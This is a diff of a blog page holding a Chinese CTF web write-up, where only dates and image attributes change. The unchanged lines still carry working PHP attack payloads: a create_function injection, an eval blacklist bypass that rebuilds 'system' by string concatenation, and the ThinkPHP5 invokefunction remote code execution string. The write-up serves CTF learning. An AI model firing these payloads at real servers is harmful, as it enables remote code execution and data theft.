@@ -36,7 +36,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/04/29/XMCTF/4.png">
 <meta property="og:image" content="http://yoursite.com/2020/04/29/XMCTF/5.png">
 <meta property="article:published_time" content="2020-04-29T07:25:44.000Z">
-<meta property="article:modified_time" content="2020-05-08T10:01:46.710Z">
+<meta property="article:modified_time" content="2020-07-14T05:11:36.995Z">
 <meta property="article:author" content="Peguin">
 <meta property="article:tag" content="xm">
 <meta name="twitter:card" content="summary">
@@ -225,7 +225,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-05-08 18:01:46" itemprop="dateModified" datetime="2020-05-08T18:01:46+08:00">2020-05-08</time>
+                <time title="Modified: 2020-07-14 13:11:36" itemprop="dateModified" datetime="2020-07-14T13:11:36+08:00">2020-07-14</time>
               </span>
 
           
@@ -247,7 +247,7 @@
 <p>变量覆盖,extract($_POST)打开了全局变量POST，可以用post的值来覆盖key绕过第一个条件，后面的正则匹配通过查资料发现是一个创建函数</p>
 <p>payload:?act=\create_function&amp;arg=){}var_dump(scandir(‘../‘));//</p>
 <p>相当于是function xxx(arg){}=function(){var_dump(scandir(‘../‘));}//){},后面的两个斜杠注释了后面的内容，这样函数就完整了</p>
-<img src="/2020/04/29/XMCTF/1.png" class="" title="examplename">
+<img src="/2020/04/29/XMCTF/1.png" class="">
 
 <p>可以看到有”ffflll4g”文件，读取文件就可以了</p>
 <h4 id="0X02：WEB7"><a href="#0X02：WEB7" class="headerlink" title="0X02：WEB7"></a>0X02：WEB7</h4><p>打开地址，源码给了，审计</p>
@@ -255,20 +255,20 @@
 
 <p>payload：?code=$<em>=~%98%9A%8B%B9%93%9E%98;$</em>();相当于是code=$_=getFlag;getFlag();</p>
 <h4 id="0X03-WEB4"><a href="#0X03-WEB4" class="headerlink" title="0X03:WEB4"></a>0X03:WEB4</h4><p>打开题目给了一串key：e086aa137fa19f67d27b39d0eca18610，MD5解密一下，是一串ip地址，1.1.1.1,用burp抓包伪造ip</p>
-<img src="/2020/04/29/XMCTF/2.png" class="" title="examplename">
+<img src="/2020/04/29/XMCTF/2.png" class="">
 
 <p>访问dhudndrgrhs.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$disable_fun = [<span class="string">"assert"</span>,<span class="string">"print_r"</span>,<span class="string">"system"</span>, <span class="string">"shell_exec"</span>,<span class="string">"ini_set"</span>, <span class="string">"scandir"</span>, <span class="string">"exec"</span>,<span class="string">"proc_open"</span>, <span class="string">"error_log"</span>, <span class="string">"ini_alter"</span>, <span class="string">"ini_set"</span>, <span class="string">"pfsockopen"</span>, <span class="string">"readfile"</span>, <span class="string">"echo"</span>, <span class="string">"file_get_contents"</span>, <span class="string">"readlink"</span>, <span class="string">"symlink"</span>, <span class="string">"popen"</span>, <span class="string">"fopen"</span>, <span class="string">"file"</span>, <span class="string">"fpassthru"</span>];</span><br><span class="line">$disable_fun = array_merge($disable_fun, get_defined_functions()[<span class="string">'internal'</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($disable_fun <span class="keyword">as</span> $i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($_GET[shell], $i)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'xmctf'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_GET[shell]); </span><br><span class="line"><span class="comment">//几乎所有的远程命令执行漏洞都被ban了，这里可以利用php的字符串拼接，拼接命令来绕过正则</span></span><br><span class="line">payload=$a=<span class="string">'sys'</span>.<span class="string">'tem'</span>;$a(<span class="string">'cat flag.php'</span>);</span><br><span class="line">可以看到flag.php文件，读取，在网页源码处发现flag</span><br></pre></td></tr></table></figure>
 
-<h4 id="0X04-WEB10"><a href="#0X04-WEB10" class="headerlink" title="0X04:WEB10"></a>0X04:WEB10</h4><img src="/2020/04/29/XMCTF/3.png" class="" title="examplename">
+<h4 id="0X04-WEB10"><a href="#0X04-WEB10" class="headerlink" title="0X04:WEB10"></a>0X04:WEB10</h4><img src="/2020/04/29/XMCTF/3.png" class="">
 
 <p>可以看到提示是thinkphp5版本，直接上payload</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php？s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo();</span><br></pre></td></tr></table></figure>
 
-<img src="/2020/04/29/XMCTF/4.png" class="" title="examplename">
+<img src="/2020/04/29/XMCTF/4.png" class="">
 
 <p>成功回显phpinfo页面，下面就可以爆目录文件了</p>
-<img src="/2020/04/29/XMCTF/5.png" class="" title="examplename">
+<img src="/2020/04/29/XMCTF/5.png" class="">
 
 <p>在根目录下找到了flag文件，直接读取 system(“cat /flag”)即可</p>
 <h4 id="0X05-webEASYSESSION"><a href="#0X05-webEASYSESSION" class="headerlink" title="0X05:webEASYSESSION"></a>0X05:webEASYSESSION</h4><p>给了源码，审计</p>
